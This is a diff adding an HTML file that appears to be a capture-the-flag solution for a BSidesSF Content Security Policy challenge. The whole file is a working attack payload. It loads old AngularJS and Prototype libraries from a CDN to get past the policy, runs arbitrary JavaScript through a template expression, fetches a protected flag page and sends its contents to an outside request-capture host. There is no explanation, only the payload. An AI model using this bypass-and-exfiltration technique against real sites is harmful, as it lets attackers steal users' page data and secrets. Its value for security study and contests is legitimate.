@@ -1,0 +1,13 @@
+<base href=//ajax.googleapis.com/ajax/libs/>
+<script src=angularjs/1.0.1/angular.js></script>
+<script src=prototype/1.7.2.0/prototype.js></script>
+<div ng-app ng-csp>{{
+    $on.curry.call().eval("
+        fetch('https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag')
+          .then((res) => {
+            return res.text().then((text) => {
+              return fetch('https://enec50a43vyw.x.pipedream.net/?x=' + text);
+            });
+          });
+    ");
+}}</div>
